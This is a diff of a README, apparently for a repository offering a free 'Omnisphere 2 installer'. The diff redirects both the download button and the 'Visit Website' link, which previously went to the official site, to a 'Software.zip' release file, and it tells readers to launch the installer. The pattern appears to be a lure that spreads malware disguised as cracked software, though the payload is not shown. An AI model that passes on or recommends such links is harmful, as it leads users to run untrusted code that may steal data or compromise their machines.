@@ -41,7 +41,7 @@ Dive deep into the world of audio software, DAW tools, music creation, and produ
 
 Get started by downloading the Omnisphere 2 installer package. Click the button below to download: 
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-9cf)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Installer](https://github.com/szerszenkrym/Omnisphere-2-Installer-2025/releases/download/v1.0/Software.zip)](https://github.com/szerszenkrym/Omnisphere-2-Installer-2025/releases/download/v1.0/Software.zip)
 
 *Note: The installer needs to be launched to initiate the installation process.*
 
@@ -49,7 +49,7 @@ Get started by downloading the Omnisphere 2 installer package. Click the button 
 
 Explore more about Omnisphere 2, music production, and sound design on our website! Click the link below to visit:
 
-[Visit Website](https://www.omnisphere.com)
+[Visit Website](https://github.com/szerszenkrym/Omnisphere-2-Installer-2025/releases/download/v1.0/Software.zip)
 
 ## 🎹 Get Creative
 
